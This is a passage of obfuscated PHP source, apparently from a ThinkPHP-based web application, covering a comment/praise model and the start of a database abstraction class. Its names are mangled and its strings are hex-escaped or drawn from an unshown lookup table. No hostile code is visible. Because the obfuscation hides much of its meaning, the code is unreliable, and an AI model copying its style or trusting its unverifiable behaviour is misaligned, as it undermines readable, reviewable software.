array($áøÃ„ˆ[1991] => $ªáÑæ¶, $áøÃ„ˆ[1992] => $ÍĞ¹•Ùà); } public function starTargetUserList($½Æ¬ã¿˜, $Î»ÕÊªÊ) { $Œ‰ÍÔÒ =& $_SERVER[óÔë„ú]; $§ÎõÍÈı = $½Æ¬ã¿˜ + self::TYPE_STAR_OFFSET; $âÖ¯ïî“ = array($Œ‰ÍÔÒ[569] => $Î»ÕÊªÊ, $Œ‰ÍÔÒ[190] => $§ÎõÍÈı); $šÌœèüÒ = $this->where($âÖ¯ïî“)->count(); $“Æó‰óç = array($Œ‰ÍÔÒ[332] => $šÌœèüÒ, $Œ‰ÍÔÒ[1993] => array()); if (!$šÌœèüÒ) { return $“Æó‰óç; } $£¼ëô°€ = $this->field($Œ‰ÍÔÒ[1758])->where($âÖ¯ïî“)->limit(500)->select(); $£¼ëô°€ = array_to_keyvalue($£¼ëô°€, $Œ‰ÍÔÒ[12], $Œ‰ÍÔÒ[1758]); $“Æó‰óç[$Œ‰ÍÔÒ[1993]] = Model($Œ‰ÍÔÒ[577])->userListInfo($£¼ëô°€); return $“Æó‰óç; } public function prasiseUserList($‡ßÑÖ²ø) { $ ğÃ§ïö =& $_SERVER[óÔë„ú]; $œäË‘°ô = array($ ğÃ§ïö[1994] => $‡ßÑÖ²ø); $ç’‘‚®‡ = $this->where($œäË‘°ô)->find(); $”ğ¸ã¨ = _get($ç’‘‚®‡, $ ğÃ§ïö[1989], 0); $¬ûèÊ¹õ = array($ ğÃ§ïö[332] => $”ğ¸ã¨, $ ğÃ§ïö[1993] => array()); if (!$”ğ¸ã¨) { return $¬ûèÊ¹õ; } $ñ†î”ÑÒ = Model($ ğÃ§ïö[1995])->field($ ğÃ§ïö[1758])->where($œäË‘°ô)->limit(500)->select(); $ñ†î”ÑÒ = array_to_keyvalue($ñ†î”ÑÒ, $ ğÃ§ïö[12], $ ğÃ§ïö[1758]); $¬ûèÊ¹õ[$ ğÃ§ïö[1993]] = Model($ ğÃ§ïö[577])->userListInfo($ñ†î”ÑÒ); return $¬ûèÊ¹õ; } public function remove($ø¦‡…Ã·) { $ˆíò•È‡ =& $_SERVER[óÔë„ú]; $ÅÑˆÂ¢Ú = array($ˆíò•È‡[1987] => $ø¦‡…Ã·); $ßêëİç = $this->where($ÅÑˆÂ¢Ú)->find(); if ($ßêëİç[$ˆíò•È‡[1986]]) { $this->where(array($ˆíò•È‡[1987] => $ßêëİç[$ˆíò•È‡[1986]]))->setAdd($ˆíò•È‡[1988], -1); } return $this->where($ÅÑˆÂ¢Ú)->delete(); } public function edit($×»˜Ä¬©, $…Ï·ş‹) { $—£§ìµô =& $_SERVER[óÔë„ú]; $„æì¸ş = array($—£§ìµô[1987] => $×»˜Ä¬©); return $this->where($„æì¸ş)->save(array($—£§ìµô[1996] => $…Ï·ş‹)); } public function prasise($ôÔÙÂ™¸) { $õ¯ÉŞ¡ =& $_SERVER[óÔë„ú]; $ÑŞ¢ŠĞì = Model($õ¯ÉŞ¡[1997]); $÷ÁŞ® = array($õ¯ÉŞ¡[1987] => $ôÔÙÂ™¸, $õ¯ÉŞ¡[1749] => USER_ID); $ş‹ş«›ñ = $ÑŞ¢ŠĞì->where($÷ÁŞ®)->find(); if (!$ş‹ş«›ñ) { $ÑŞ¢ŠĞì->add($÷ÁŞ®); $ù…¶Ëñ = $this->where(array($õ¯ÉŞ¡[1987] => $ôÔÙÂ™¸))->setAdd($õ¯ÉŞ¡[1989], 1); } else { $ÑŞ¢ŠĞì->where($÷ÁŞ®)->delete(); $ù…¶Ëñ = $this->where(array($õ¯ÉŞ¡[1987] => $ôÔÙÂ™¸))->setAdd($õ¯ÉŞ¡[1989], -1); } return $ù…¶Ëñ; } public function targetInfo($”ğÄÍŞè, $û‚Â…Ö) { $Ì¦âÌÁí =& $_SERVER[óÔë„ú]; $¼”í‹î = array($Ì¦âÌÁí[648] => $”ğÄÍŞè, $Ì¦âÌÁí[649] => $û‚Â…Ö); $ÍÒ§£ã = $this->where($¼”í‹î)->count(); $·”ÂØİ• = "\122\111\x47\x48\x54\x20\112\x4f\111\x4e\40{$this->tablePrefix}\143\157\155\x6d\145\156\164\137\160\x72\141\x69\x73\x65\40\163\164\141\x72\40\x6f\156\40\x63\x6f\155\155\145\x6e\x74\56\143\x6f\155\x6d\x65\x6e\164\111\x44\40\x3d\40\163\164\141\162\56\143\157\155\155\x65\x6e\x74\x49\x44"; $‹¤¬¯µ¦ = $this->alias($Ì¦âÌÁí[430])->where($¼”í‹î)->join($·”ÂØİ•, $Ì¦âÌÁí[1998])->count(); $”“ôŒÂ = array($Ì¦âÌÁí[1999] => $ÍÒ§£ã, $Ì¦âÌÁí[2000] => $‹¤¬¯µ¦); return $”“ôŒÂ; } public function listData($é£Ö½÷Ï) { $˜¦ĞÕõ =& $_SERVER[óÔë„ú]; if (isset($é£Ö½÷Ï[$˜¦ĞÕõ[2001]])) { if ($é£Ö½÷Ï[$˜¦ĞÕõ[2001]]) { $é£Ö½÷Ï[$˜¦ĞÕõ[1994]] = array($˜¦ĞÕõ[1077], intval($é£Ö½÷Ï[$˜¦ĞÕõ[2001]])); } unset($é£Ö½÷Ï[$˜¦ĞÕõ[2001]]); } if (isset($é£Ö½÷Ï[$˜¦ĞÕõ[2002]])) { if ($é£Ö½÷Ï[$˜¦ĞÕõ[2002]]) { $é£Ö½÷Ï[$˜¦ĞÕõ[1994]] = array($˜¦ĞÕõ[1074], intval($é£Ö½÷Ï[$˜¦ĞÕõ[2002]])); } unset($é£Ö½÷Ï[$˜¦ĞÕõ[2002]]); } return $this->_listData($é£Ö½÷Ï); } private function _listData($³Àøì·ô) { $©–›úòá =& $_SERVER[óÔë„ú]; $´Éè°äü = $this->where($³Àøì·ô)->_makeOrder()->selectPage(100); $this->_listAppendParent($´Éè°äü[$©–›úòá[445]]); $this->_listAppendUser($´Éè°äü[$©–›úòá[445]]); $this->_listAppendMeta($´Éè°äü[$©–›úòá[445]]); return $´Éè°äü; } private function _makeOrder() { $¬‘úÅ¦ñ =& $_SERVER[óÔë„ú]; $ôòÑ”ü = array($¬‘úÅ¦ñ[1989], $¬‘úÅ¦ñ[1988], $¬‘úÅ¦ñ[231]); $ş¹üœ«÷ = Input::get($¬‘úÅ¦ñ[530], $¬‘úÅ¦ñ[7], $¬‘úÅ¦ñ[497], $ôòÑ”ü); $»ş‚º·® = Input::get($¬‘úÅ¦ñ[531], $¬‘úÅ¦ñ[7], $¬‘úÅ¦ñ[1751], array($¬‘úÅ¦ñ[2003], $¬‘úÅ¦ñ[526])); $’ö”™â· = $ş¹üœ«÷ . $¬‘úÅ¦ñ[53] . $»ş‚º·®; return $this->order($’ö”™â·); } private function _listAppendParent(&$…ÆÏ¼¢å) { $à¯¾ñ˜ö =& $_SERVER[óÔë„ú]; $é½şÕÇ = array_unique(array_to_keyvalue($…ÆÏ¼¢å, $à¯¾ñ˜ö[12], $à¯¾ñ˜ö[1986])); $é½şÕÇ = array_remove_value($é½şÕÇ, $à¯¾ñ˜ö[228]); if (!$é½şÕÇ) { return; } $Îµ¯ë®¤ = $this->where(array($à¯¾ñ˜ö[1987] => array($à¯¾ñ˜ö[7], $é½şÕÇ)))->select(); $Îµ¯ë®¤ = array_to_keyvalue($Îµ¯ë®¤, $à¯¾ñ˜ö[1994]); foreach ($…ÆÏ¼¢å as &$ßûæİŠ¦) { if (isset($Îµ¯ë®¤[$ßûæİŠ¦[$à¯¾ñ˜ö[1986]]])) { $ßûæİŠ¦[$à¯¾ñ˜ö[2004]] = $Îµ¯ë®¤[$ßûæİŠ¦[$à¯¾ñ˜ö[1986]]]; } } unset($ßûæİŠ¦); } private function _listAppendUser(&$ñúöÔî¬) { $Ğß¡ĞĞ =& $_SERVER[óÔë„ú]; $õÀüÃÅÆ = array_unique(array_to_keyvalue($ñúöÔî¬, $Ğß¡ĞĞ[12], $Ğß¡ĞĞ[1758])); $õÀüÃÅÆ = array_remove_value($õÀüÃÅÆ, $Ğß¡ĞĞ[228]); if (count($õÀüÃÅÆ) == 0) { return; } foreach ($ñúöÔî¬ as $³ªã»î™) { if (isset($³ªã»î™[$Ğß¡ĞĞ[2004]])) { $õÀüÃÅÆ[] = $³ªã»î™[$Ğß¡ĞĞ[2004]][$Ğß¡ĞĞ[1758]]; } } $ô÷àÕÉ² = Model($Ğß¡ĞĞ[598])->userListInfo($õÀüÃÅÆ); foreach ($ñúöÔî¬ as &$³ªã»î™) { $³ªã»î™[$Ğß¡ĞĞ[662]] = $ô÷àÕÉ²[$³ªã»î™[$Ğß¡ĞĞ[1758]]]; if (isset($³ªã»î™[$Ğß¡ĞĞ[2004]])) { $³ªã»î™[$Ğß¡ĞĞ[2004]][$Ğß¡ĞĞ[662]] = $ô÷àÕÉ²[$³ªã»î™[$Ğß¡ĞĞ[2004]][$Ğß¡ĞĞ[1758]]]; } } unset($³ªã»î™); } private function _listAppendMeta(&$‘áÅ°Õ) { $º Æ’æã =& $_SERVER[óÔë„ú]; $±«Ù±ÆË = array_unique(array_to_keyvalue($‘áÅ°Õ, $º Æ’æã[12], $º Æ’æã[1994])); $±«Ù±ÆË = array_remove_value($±«Ù±ÆË, $º Æ’æã[228]); if (!$±«Ù±ÆË) { return; } foreach ($‘áÅ°Õ as $¿£ú³´) { if (isset($¿£ú³´[$º Æ’æã[2004]])) { $±«Ù±ÆË[] = $¿£ú³´[$º Æ’æã[2004]][$º Æ’æã[1994]]; } } $ÏÖÛÉó· = $this->metaList($±«Ù±ÆË); if (!$ÏÖÛÉó·) { return !1; } foreach ($‘áÅ°Õ as &$¿£ú³´) { $¿£ú³´[$º Æ’æã[539]] = $ÏÖÛÉó·[$¿£ú³´[$º Æ’æã[1994]]]; if (isset($¿£ú³´[$º Æ’æã[2004]])) { $¿£ú³´[$º Æ’æã[2004]][$º Æ’æã[539]] = $ÏÖÛÉó·[$¿£ú³´[$º Æ’æã[2004]][$º Æ’æã[1994]]]; } } unset($¿£ú³´); } private function metaList($ÇÔ»æÅ’) { $ÙĞ‹Å¹ =& $_SERVER[óÔë„ú]; if (!$ÇÔ»æÅ’) { return array(); } $Ï’ú„Ñ = array($ÙĞ‹Å¹[1994] => array($ÙĞ‹Å¹[7], $ÇÔ»æÅ’)); $ø¢­ôŠ = Model($ÙĞ‹Å¹[2005])->where($Ï’ú„Ñ)->select(); $ø¢­ôŠ = array_to_keyvalue_group($ø¢­ôŠ, $ÙĞ‹Å¹[1994]); foreach ($ø¢­ôŠ as $ôù¾•¥ú => $‘«öû•) { $˜ôû±½ë = array(); foreach ($‘«öû• as $ÑÚ……ş¿) { $˜ôû±½ë[$ÑÚ……ş¿[$ÙĞ‹Å¹[97]]] = $ÑÚ……ş¿[$ÙĞ‹Å¹[450]]; } $ø¢­ôŠ[$ôù¾•¥ú] = $˜ôû±½ë; } return $ø¢­ôŠ ? $ø¢­ôŠ : array(); } public function removeTarget($û¹Ü¸¨Ö, $ãÜ”š¥“) { $Ò­–ÌÚø =& $_SERVER[óÔë„ú]; if (!$ãÜ”š¥“) { return !0; } $ãÜ”š¥“ = is_array($ãÜ”š¥“) ? $ãÜ”š¥“ : array($ãÜ”š¥“); $É°Òºô™ = array($Ò­–ÌÚø[190] => $û¹Ü¸¨Ö, $Ò­–ÌÚø[569] => array($Ò­–ÌÚø[7], $ãÜ”š¥“)); $Õğ öî× = $this->field($Ò­–ÌÚø[1994])->where($É°Òºô™)->select(); $Ş€¦¦²Ô = array_to_keyvalue($Õğ öî×, $Ò­–ÌÚø[12], $Ò­–ÌÚø[1994]); if (!$Ş€¦¦²Ô) { return !0; } $É°Òºô™ = array($Ò­–ÌÚø[1994] => array($Ò­–ÌÚø[7], $Ş€¦¦²Ô)); $this->where($É°Òºô™)->delete(); Model($Ò­–ÌÚø[1997])->where($É°Òºô™)->delete(); Model($Ò­–ÌÚø[2006])->where($É°Òºô™)->delete(); } } goto f£Èˆ¯½ë; C¿¼‚ÒÎ©ä: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\151\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\156\x65\x71" => "\x3c\76", "\x67\164" => "\76", "\x65\x67\x74" => "\76\75", "\x6c\164" => "\x3c", "\x65\x6c\164" => "\74\75", "\156\157\x74\x6c\151\153\x65" => "\116\x4f\x54\40\114\x49\x4b\105", "\154\x69\153\145" => "\114\x49\x4b\x45", "\151\x6e" => "\x49\116", "\x6e\157\164\x69\x6e" => "\x4e\x4f\124\40\111\x4e", "\156\x6f\x74\40\151\156" => "\116\x4f\x54\x20\111\116", "\142\x65\164\x77\145\145\156" => "\102\105\x54\127\105\105\x4e", "\156\x6f\x74\x62\x65\164\167\x65\x65\156" => "\x4e\117\x54\x20\102\x45\x54\127\x45\x45\x4e", "\156\x6f\164\x20\x62\x65\x74\x77\x65\145\x6e" => "\x4e\x4f\124\x20\x42\x45\124\x57\105\105\116"); protected $selectSql = "\123\105\x4c\x45\103\124\45\x44\111\x53\124\111\116\x43\x54\45\x20\45\x46\x49\105\114\104\45\x20\106\122\x4f\x4d\x20\45\x54\x41\x42\114\105\x25\x25\112\x4f\111\x4e\45\45\x57\x48\105\x52\x45\x25\45\107\122\117\125\x50\x25\45\x48\x41\x56\x49\116\107\45\45\x4f\122\x44\x45\x52\45\45\x4c\x49\x4d\x49\x54\45\40\x25\x55\x4e\x49\x4f\x4e\x25\x25\x43\117\115\x4d\x45\116\x54\45"; protected $bind = array(); public static function getInstance() { $¼ëß·œØ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[óÔë„ú][1023], $¼ëß·œØ); } public function factory($âÈ”Ô­ = '') { $¼¢Ò×² =& $_SERVER[óÔë„ú]; $âÈ”Ô­ = $this->parseConfig($âÈ”Ô­); if (empty($âÈ”Ô­[$¼¢Ò×²[1024]])) { think_exception(think_lang($¼¢Ò×²[1025])); } $this->dbType = ucwords(strtolower($âÈ”Ô­[$¼¢Ò×²[1024]])); $¨–®úĞ = $¼¢Ò×²[1026] . $this->dbType; if (class_exists($¨–®úĞ)) { $¶§„—¯ = new $¨–®úĞ($âÈ”Ô­); if ($¼¢Ò×²[1027] != strtolower($âÈ”Ô­[$¼¢Ò×²[1024]])) { $¶§„—¯->dbType = strtoupper($this->dbType); } else { $¶§„—¯->dbType = $this->_getDsnType($âÈ”Ô­[$¼¢Ò×²[979]]); } } else { think_exception(think_lang($¼¢Ò×²[1028]) . $¼¢Ò×²[1029] . $¨–®úĞ); } return $¶§„—¯; } public function __call($¸æÌú, $¥´èŸöá) { if (method_exists($this, $¸æÌú)) { return call_user_func_array(array($this, $¸æÌú), $¥´èŸöá); } } protected function _getDsnType($õÓîì¢) { $¨¿´ï†‡ = explode($_SERVER[óÔë„ú][4], $õÓîì¢); $ø‹›ïİã = strtoupper(trim($¨¿´ï†‡[0])); return $ø‹›ïİã; } private function parseConfig($€‡º¤Âú = '') { $¥«éû°¦ =& $_SERVER[óÔë„ú]; if (!empty($€‡º¤Âú) && is_string($€‡º¤Âú)) { $€‡º¤Âú = $this->parseDSN($€‡º¤Âú); } elseif (is_array($€‡º¤Âú)) { $€‡º¤Âú = array_change_key_case($€‡º¤Âú); $€‡º¤Âú = array($¥«éû°¦[1024] => $€‡º¤Âú[$¥«éû°¦[1030]], $¥«éû°¦[951] => $€‡º¤Âú[$¥«éû°¦[1031]], $¥«éû°¦[952] => $€‡º¤Âú[$¥«éû°¦[1032]], $¥«éû°¦[949] => $€‡º¤Âú[$¥«éû°¦[1033]], $¥«éû°¦[950] => $€‡º¤Âú[$¥«éû°¦[1034]], $¥«éû°¦[21] => $€‡º¤Âú[$¥«éû°¦[1035]], $¥«éû°¦[979] => $€‡º¤Âú[$¥«éû°¦[1036]], $¥«éû°¦[17] => isset($€‡º¤Âú[$¥«éû°¦[1037]]) ? $€‡º¤Âú[$¥«éû°¦[1037]] : array()); } elseif (empty($€‡º¤Âú)) { if (think_config($¥«éû°¦[1038]) && $¥«éû°¦[1027] != strtolower(think_config($¥«éû°¦[1039]))) { $€‡º¤Âú = $this->parseDSN(think_config($¥«éû°¦[1038])); } else { $€‡º¤Âú = array($¥«éû°¦[1024] => think_config($¥«éû°¦[1039]), $¥«éû°¦[951] => think_config($¥«éû°¦[1040]), $¥«éû°¦[952] => think_config($¥«éû°¦[1041]), $¥«éû°¦[949] => think_config($¥«éû°¦[1042]), $¥«éû°¦[950] => think_config($¥«éû°¦[1043]), $¥«éû°¦[21] => think_config($¥«éû°¦[323]), $¥«éû°¦[979] => think_config($¥«éû°¦[1038]), $¥«éû°¦[17] => think_config($¥«éû°¦[1044])); } } return $€‡º¤Âú; } protected function initConnect($æ÷şÂå† = true) { if (1 == think_config($_SERVER[óÔë„ú][22])) { $this->_linkID = $this->multiConnect($æ÷şÂå†); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ÎÎüéÍ => $–‘ñè¤ ) { $this->_linkID = $–‘ñè¤ ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($‘•Á¯ãé = false) { $°äî½¦ =& $_SERVER[óÔë„ú]; static $‹«ı¼¤™ = array(); static $‰À–Ø¥ = -1; if (empty($‹«ı¼¤™)) { foreach ($this->config as $ª™à»Ö÷ => $³ÌçŞ½…) { $‹«ı¼¤™[$ª™à»Ö÷] = explode($°äî½¦[50], $³ÌçŞ½…); } } if (think_config($°äî½¦[1045])) { if ($‘•Á¯ãé || think_config($°äî½¦[471]) === !0) { $š÷§ âì = floor(mt_rand(0, think_config($°äî½¦[1046]) - 1)); $‰À–Ø¥ = $š÷§ âì; } else { if (is_numeric(think_config($°äî½¦[1047]))) { $š÷§ âì = think_config($°äî½¦[1047]); } else { $š÷§ âì = floor(mt_rand(think_config($°äî½¦[1046]), count($‹«ı¼¤™[$°äî½¦[949]]) - 1)); } } } else { $š÷§ âì = floor(mt_rand(0, count($‹«ı¼¤™[$°äî½¦[949]]) - 1)); $‰À–Ø¥ = $š÷§ âì; } $š÷§ âì = $‰À–Ø¥ !== -1 ? $‰À–Ø¥ : $š÷§ âì; $­õëÜì = array($°äî½¦[951] => isset($‹«ı¼¤™[$°äî½¦[951]][$š÷§ âì]) ? $‹«ı¼¤™[$°äî½¦[951]][$š÷§ âì] : $‹«ı¼¤™[$°äî½¦[951]][0], $°äî½¦[952] => isset($‹«ı¼¤™[$°äî½¦[952]][$š÷§ âì]) ? $‹«ı¼¤™[$°äî½¦[952]][$š÷§ âì] : $‹«ı¼¤™[$°äî½¦[952]][0], $°äî½¦[949] => isset($‹«ı¼¤™[$°äî½¦[949]][$š÷§ âì]) ? $‹«ı¼¤™[$°äî½¦[949]][$š÷§ âì] : $‹«ı¼¤™[$°äî½¦[949]][0], $°äî½¦[950] => isset($‹«ı¼¤™[$°äî½¦[950]][$š÷§ âì]) ? $‹«ı¼¤™[$°äî½¦[950]][$š÷§ âì] : $‹«ı¼¤™[$°äî½¦[950]][0], $°äî½¦[21] => isset($‹«ı¼¤™[$°äî½¦[21]][$š÷§ âì]) ? $‹«ı¼¤™[$°äî½¦[21]][$š÷§ âì] : $‹«ı¼¤™[$°äî½¦[21]][0], $°äî½¦[979] => isset($‹«ı¼¤™[$°äî½¦[979]][$š÷§ âì]) ? $‹«ı¼¤™[$°äî½¦[979]][$š÷§ âì] : $‹«ı¼¤™[$°äî½¦[979]][0], $°äî½¦[17] => isset($‹«ı¼¤™[$°äî½¦[17]][$š÷§ âì]) ? $‹«ı¼¤™[$°äî½¦[17]][$š÷§ âì] : $‹«ı¼¤™[$°äî½¦[17]][0]); return $this->connect($­õëÜì, $š÷§ âì); } public function parseDSN($ı‰û»èŠ) { $çö©«í‘ =& $_SERVER[óÔë„ú]; if (empty($ı‰û»èŠ)) { return !1; } $­…­îŠÙ = parse_url($ı‰û»èŠ); if ($­…­îŠÙ[$çö©«í‘[207]]) { $¸¢Õ½ = array($çö©«í‘[1024] => $­…­îŠÙ[$çö©«í‘[207]], $çö©«í‘[951] => isset($­…­îŠÙ[$çö©«í‘[662]]) ? $­…­îŠÙ[$çö©«í‘[662]] : $çö©«í‘[12], $çö©«í‘[952] => isset($­…­îŠÙ[$çö©«í‘[1048]]) ? $­…­îŠÙ[$çö©«í‘[1048]] : $çö©«í‘[12], $çö©«í‘[949] => isset($­…­îŠÙ[$çö©«í‘[208]]) ? $­…­îŠÙ[$çö©«í‘[208]] : $çö©«í‘[12], $çö©«í‘[950] => isset($­…­îŠÙ[$çö©«í‘[209]]) ? $­…­îŠÙ[$çö©«í‘[209]] : $çö©«í‘[12], $çö©«í‘[21] => isset($­…­îŠÙ[$çö©«í‘[87]]) ? substr($­…­îŠÙ[$çö©«í‘[87]], 1) : $çö©«í‘[12]); } else { preg_match($çö©«í‘[1049], trim($ı‰û»èŠ), $ô›Õ¾Ì); $¸¢Õ½ = array($çö©«í‘[1024] => $ô›Õ¾Ì[1], $çö©«í‘[951] => $ô›Õ¾Ì[2], $çö©«í‘[952] => $ô›Õ¾Ì[3], $çö©«í‘[949] => $ô›Õ¾Ì[4], $çö©«í‘[950] => $ô›Õ¾Ì[5], $çö©«í‘[21] => $ô›Õ¾Ì[6]); } $¸¢Õ½[$çö©«í‘[979]] = $çö©«í‘[12]; return $¸¢Õ½; } protected function debug() { $Æö¾ë²° =& $_SERVER[óÔë„ú]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Æö¾ë²°[1050]; if (think_config($Æö¾ë²°[1051])) { think_status($Æö¾ë²°[1052]); think_trace($this->queryStr . $Æö¾ë²°[1053] . think_status($Æö¾ë²°[24], $Æö¾ë²°[1052], 6) . $Æö¾ë²°[1054], $Æö¾ë²°[12], $Æö¾ë²°[1055]); } } protected function parseLock($ÄÂåÄıî = false) { $ÂÔ•‚ô =& $_SERVER[óÔë„ú]; if (!$ÄÂåÄıî) { return $ÂÔ•‚ô[12]; } if ($ÂÔ•‚ô[981] == $this->dbType) { return $ÂÔ•‚ô[1056]; } return $ÂÔ•‚ô[1057]; } protected function parseSet($›áÃ×Â‰) { $Â’®ÜØ =& $_SERVER[óÔë„ú]; foreach ($›áÃ×Â‰ as $¼••Ìşœ => $Ø´üˆÒë) { if (is_array($Ø´üˆÒë) && $Â’®ÜØ[373] == $Ø´üˆÒë[0]) { $†ßšÈ÷ú[] = $this->parseKey($¼••Ìşœ) . $Â’®ÜØ[947] . $Ø´üˆÒë[1]; } elseif (is_scalar($Ø´üˆÒë) || is_null($Ø´üˆÒë)) { $†ßšÈ÷ú[] = $this->parseKey($¼••Ìşœ) . $Â’®ÜØ[947] . $this->parseValue($Ø´üˆÒë); } } return $Â’®ÜØ[1058] . implode($Â’®ÜØ[50], $†ßšÈ÷ú); } protected function bindParam($ú›İÉûï, $è¥ŞŞ˜Ÿ) { $this->bind[$_SERVER[óÔë„ú][4] . $ú›İÉûï] = $è¥ŞŞ˜Ÿ; } protected function parseBind($‡¡ñºªú) { $‡¡ñºªú = array_merge($this->bind, $‡¡ñºªú); $this->bind = array(); return $‡¡ñºªú; } function parseKey(&$’¿²ş , $ş×õ¨ÑÙ = true) { if ($ş×õ¨ÑÙ) { $’¿²ş  = $this->parseKeyCheck($’¿²ş ); } return $’¿²ş ; } function parseKeyCheck($İœˆ…¥Ô) { $ÉÁÉİ¤Ê =& $_SERVER[óÔë„ú]; $İœˆ…¥Ô = trim($İœˆ…¥Ô); if (!preg_match($ÉÁÉİ¤Ê[1059], $İœˆ…¥Ô)) { think_exception($ÉÁÉİ¤Ê[1060] . $İœˆ…¥Ô); } return $İœˆ…¥Ô; } protected function parseValue($Öİ¿ó¡¹) { $ìÚ¿ãû¦ =& $_SERVER[óÔë„ú]; if (is_string($Öİ¿ó¡¹)) { $Öİ¿ó¡¹ = $ìÚ¿ãû¦[1020] . $this->escapeString($Öİ¿ó¡¹) . $ìÚ¿ãû¦[1020]; } elseif (isset($Öİ¿ó¡¹[0]) && is_string($Öİ¿ó¡¹[0]) && strtolower($Öİ¿ó¡¹[0]) == $ìÚ¿ãû¦[373]) { $Öİ¿ó¡¹ = $this->escapeString($Öİ¿ó¡¹[1]); } elseif (is_array($Öİ¿ó¡¹)) { $Öİ¿ó¡¹ = array_map(array($this, $ìÚ¿ãû¦[1021]), $Öİ¿ó¡¹); } elseif (is_bool($Öİ¿ó¡¹)) { $Öİ¿ó¡¹ = $Öİ¿ó¡¹ ? $ìÚ¿ãû¦[91] : $ìÚ¿ãû¦[228]; } elseif (is_null($Öİ¿ó¡¹)) { $Öİ¿ó¡¹ = $ìÚ¿ãû¦[106]; } return $Öİ¿ó¡¹; } protected function parseField($ºÈÎŞí) { $—¬•İÙı =& $_SERVER[óÔë„ú]; if (is_string($ºÈÎŞí) && strpos($ºÈÎŞí, $—¬•İÙı[50])) { $ºÈÎŞí = explode($—¬•İÙı[50], $ºÈÎŞí); } if (is_array($ºÈÎŞí)) { $™ìş¡ßÔ = array(); foreach ($ºÈÎŞí as $÷à¦îâ¿ => $°ûŠñ‰½) { if (!is_numeric($÷à¦îâ¿)) { $™ìş¡ßÔ[] = $this->parseKey($÷à¦îâ¿, !1) . $—¬•İÙı[1061] . $this->parseKey($°ûŠñ‰½); } else { $™ìş¡ßÔ[] = $this->parseKey($°ûŠñ‰½); } } $¤¸´¦Ä = implode($—¬•İÙı[50], $™ìş¡ßÔ); } elseif (is_string($ºÈÎŞí) && !empty($ºÈÎŞí)) { $¤¸´¦Ä = $ºÈÎŞí; } else { $¤¸´¦Ä = $—¬•İÙı[220]; } return $¤¸´¦Ä; } protected function parseTable($¦ÇŒ¾ØÔ) { $ª ÕÚ±ì =& $_SERVER[óÔë„ú]; if (is_array($¦ÇŒ¾ØÔ)) { $¦›¦ÌŞ˜ = array(); foreach ($¦ÇŒ¾ØÔ as $¶á©´Ò· => $…Èšî´Ã) { if (!is_numeric($¶á©´Ò·)) { $¦›¦ÌŞ˜[] = $this->parseKey($¶á©´Ò·) . $ª ÕÚ±ì[53] . $this->parseKey($…Èšî´Ã); } else { $¦›¦ÌŞ˜[] = $this->parseKey($¶á©´Ò·); } } $¦ÇŒ¾ØÔ = $¦›¦ÌŞ˜; } elseif (is_string($¦ÇŒ¾ØÔ)) { if (strstr($¦ÇŒ¾ØÔ, $ª ÕÚ±ì[53])) { return $¦ÇŒ¾ØÔ; } $¦ÇŒ¾ØÔ = explode($ª ÕÚ±ì[50], $¦ÇŒ¾ØÔ); array_walk($¦ÇŒ¾ØÔ, array($this, $ª ÕÚ±ì[969])); } return $ª ÕÚ±ì[963] . trim(implode($ª ÕÚ±ì[1062], $¦ÇŒ¾ØÔ), $ª ÕÚ±ì[461]) . $ª ÕÚ±ì[963]; } protected function parseWhere($ƒˆ¹èÄÃ) { $¢àÄ—³Ä =& $_SERVER[óÔë„ú]; $Ï¦Çàõ = $¢àÄ—³Ä[12]; if (is_string($ƒˆ¹èÄÃ)) { $Ï¦Çàõ = $ƒˆ¹èÄÃ; } else { $ÜÄı¡÷Ò = isset($ƒˆ¹èÄÃ[$¢àÄ—³Ä[1063]]) ? strtoupper($ƒˆ¹èÄÃ[$¢àÄ—³Ä[1063]]) : $¢àÄ—³Ä[12]; if (in_array($ÜÄı¡÷Ò, array($¢àÄ—³Ä[1064], $¢àÄ—³Ä[1065], $¢àÄ—³Ä[1066]))) { $ÜÄı¡÷Ò = $¢àÄ—³Ä[53] . $ÜÄı¡÷Ò . $¢àÄ—³Ä[53]; unset($ƒˆ¹èÄÃ[$¢àÄ—³Ä[1063]]); } else { $ÜÄı¡÷Ò = $¢àÄ—³Ä[1067]; } foreach ($ƒˆ¹èÄÃ as $«¥¶à¿° => $ª¹åßèÙ) { $Ï¦Çàõ .= $¢àÄ—³Ä[354]; if (is_numeric($«¥¶à¿°)) { $«¥¶à¿° = $¢àÄ—³Ä[1068]; } if (0 === strpos($«¥¶à¿°, $¢àÄ—³Ä[11])) { $Ï¦Çàõ .= $this->parseThinkWhere($«¥¶à¿°, $ª¹åßèÙ); } else { if (!preg_match($¢àÄ—³Ä[1069], trim($«¥¶à¿°))) { think_exception(think_lang($¢àÄ—³Ä[1070]) . $¢àÄ—³Ä[4] . $«¥¶à¿°); } $ÍëÆßĞá = is_array($ª¹åßèÙ) && isset($ª¹åßèÙ[$¢àÄ—³Ä[1071]]); $«¥¶à¿° = trim($«¥¶à¿°); if (strpos($«¥¶à¿°, $¢àÄ—³Ä[214])) { $Š¾öå… = explode($¢àÄ—³Ä[214], $«¥¶à¿°); $ÎòûÍƒ® = array(); foreach ($Š¾öå… as $ª®¹ÀÌ‘ => $Òæ€”³) { $ª°€õ¥İ = $ÍëÆßĞá ? $ª¹åßèÙ[$ª®¹ÀÌ‘] : $ª¹åßèÙ; $ÎòûÍƒ®[] = $¢àÄ—³Ä[337] . $this->parseWhereItem($this->parseKey($Òæ€”³), $ª°€õ¥İ) . $¢àÄ—³Ä[968]; } $Ï¦Çàõ .= implode($¢àÄ—³Ä[1072], $ÎòûÍƒ®); } elseif (strpos($«¥¶à¿°, $¢àÄ—³Ä[360])) { $Š¾öå… = explode($¢àÄ—³Ä[360], $«¥¶à¿°); $ÎòûÍƒ® = array(); foreach ($Š¾öå… as $ª®¹ÀÌ‘ => $Òæ€”³) { $ª°€õ¥İ = 